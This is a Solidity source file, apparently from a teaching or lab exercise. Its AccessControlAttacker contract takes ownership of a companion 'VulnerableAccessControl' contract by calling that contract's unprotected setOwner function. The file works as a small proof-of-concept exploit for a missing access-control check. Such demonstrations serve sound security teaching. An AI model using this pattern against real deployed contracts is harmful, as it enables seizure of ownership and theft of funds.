// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;
import {VulnerableAccessControl} from "./VulnerableAccessControl.sol";

contract AccessControlAttacker {
    VulnerableAccessControl public vulnerableContract;

    constructor(address _vulnerableContractt) {
        vulnerableContract = VulnerableAccessControl(_vulnerableContractt);
    }

    function attack(address _newOwnert) public {
        // Exploit the vulnerability by changing the owner
        vulnerableContract.setOwner(_newOwnert);
    }

    function getOwner() public view returns (address) {
        return vulnerableContract.owner();
    }
}
